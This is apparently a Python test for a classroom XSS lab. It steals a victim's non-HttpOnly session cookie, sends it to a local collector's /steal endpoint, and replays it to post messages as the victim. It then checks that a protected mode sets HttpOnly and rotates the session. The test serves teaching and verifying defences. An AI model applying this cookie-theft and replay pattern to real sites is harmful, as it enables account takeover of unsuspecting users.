from attacks.test_lab import apps,login,token
from attacks import lab

def test_real_lab_session_hijack(apps):
    victim=apps['xss'].test_client();student=apps['xss'].test_client()
    login(victim,'pony');login(student,'alice')
    stolen=victim.get_cookie('xss_lab_session').value
    assert not victim.get_cookie('xss_lab_session').http_only
    collector=apps['collector'].test_client()
    collector.get('/steal',query_string={'cookie':'fake_session=XSS-CLASSROOM-ONLY; xss_lab_session='+stolen,'username':'wrong-name'})
    with lab.db() as db:
        capture=db.execute('SELECT * FROM captures').fetchone()
        assert capture['username']=='pony'
        assert capture['content']=='xss_lab_session='+stolen
    login(collector,'alice')
    assert stolen in collector.get('/').text
    student.set_cookie('xss_lab_session',stolen)
    assert '<strong>pony</strong>' in student.get('/').text
    student.post('/',data={'csrf_token':token(student),'content':'impersonated lab message'})
    with lab.db() as db:assert db.execute('SELECT username FROM messages').fetchone()['username']=='pony'
    assert student.get('/admin').status_code==403
    victim.post('/security',data={'csrf_token':token(victim),'mode':'protected'})
    assert victim.get_cookie('xss_lab_session').http_only
    assert victim.get_cookie('xss_lab_session').value!=stolen
    assert '<strong>alice</strong>' in student.get('/').text
